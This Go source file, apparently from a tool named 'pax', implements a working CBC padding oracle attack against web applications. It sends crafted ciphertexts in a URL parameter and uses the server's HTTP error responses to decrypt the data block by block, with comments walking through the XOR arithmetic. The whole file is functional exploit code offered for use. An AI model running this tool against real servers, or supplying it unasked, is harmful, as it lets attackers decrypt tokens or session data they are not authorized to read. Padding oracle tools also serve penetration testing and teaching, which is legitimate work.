package pax

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

func Exploit(url string, sample string, blockSize int) ([]byte, error) {
	return newExploiter(url, sample, blockSize).run()
}

type exploiter struct {
	client    *http.Client
	sample    string
	url       string
	blockSize int
	encoded   bool
}

func newExploiter(url string, sample string, blockSize int) *exploiter {
	return &exploiter{
		sample:    sample,
		url:       url,
		blockSize: blockSize,
		client:    &http.Client{},
	}
}

func (x *exploiter) run() ([]byte, error) {

	rawb64, err := url.QueryUnescape(x.sample)
	if err != nil {
		return nil, err
	}

	sample, err := base64.StdEncoding.DecodeString(rawb64)
	x.encoded = err == nil
	if !x.encoded { // if this isn't valid base64, just take it as literal encrypted bytes
		return nil, err
	}

	if len(sample)%x.blockSize > 0 {
		return nil, fmt.Errorf("sample data is incorrect length for given blocksize")
	}

	valid, err := x.try(sample)
	if err != nil {
		return nil, err
	}
	if !valid {
		return nil, fmt.Errorf("sample data does not appear to be valid")
	}

	random := make([]byte, x.blockSize)
	if _, err := rand.Read(random); err != nil {
		return nil, err
	}

	blockCount := len(sample) / x.blockSize

	var plaintext []byte

	for blockIndex := 1; blockIndex < blockCount; blockIndex++ {
		intermediate := make([]byte, x.blockSize)
		blockPlaintext := make([]byte, x.blockSize)

		targetBlock := sample[blockIndex*x.blockSize : (blockIndex+1)*x.blockSize]
		crafted := append(random, targetBlock...)

		for byteIndex := x.blockSize - 1; byteIndex >= 0; byteIndex-- {

			// calculate values so that all N bytes after the one we're targeting equal N
			for p := x.blockSize - 1; p > byteIndex; p-- {
				padTarget := byte(x.blockSize - byteIndex)
				/*
						C'1[16] = P'2[16] ^ I2[16]
					        	= 02      ^ 95
					        	= 93
				*/
				crafted[p] = padTarget ^ intermediate[p]
			}

			var found bool
			var i byte
			for i = 0; i <= 255; i++ {

				crafted[byteIndex] = i

				valid, err := x.try(crafted)
				if err != nil {
					return nil, err
				}

				if valid {
					found = true
					break
				}
			}

			if !found {
				return nil, fmt.Errorf("could not find bad padding")
			}

			/*

				C1' = crafted[0:16]
				P2' = ???????????????1
				P2  = ????????????????
				I2  = intermediate

				I2     = C1'     ^ P2'
				I2[16] = C1'[16] ^ P2'[16]
				       = 94      ^ 01
				       = 95

			*/

			intermediate[byteIndex] = crafted[byteIndex] ^ byte(x.blockSize-byteIndex)

			/*
				C1 = sample

				P2[16] = C1[16] ^ I2[16]
				= C1[16] ^ 95
			*/

			blockPlaintext[byteIndex] = sample[((blockIndex-1)*x.blockSize)+byteIndex] ^ intermediate[byteIndex]

		}

		plaintext = append(plaintext, blockPlaintext...)
	}

	return pkcs7Unpad(plaintext, x.blockSize)
}

// returns true if payload is valid
func (x *exploiter) try(payload []byte) (bool, error) {

	encoded := base64.StdEncoding.EncodeToString(payload)

	url := strings.ReplaceAll(x.url, x.sample, encoded)
	if url == x.url {
		//return false, fmt.Errorf("sample data not found in url: data: '%s' url: '%s'", x.sample, x.url)
	}

	//fmt.Println(url)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return false, err
	}

	response, err := x.client.Do(req)
	if err != nil {
		return false, err
	}

	if response.StatusCode > 399 {
		return false, nil
	}

	return true, nil
}
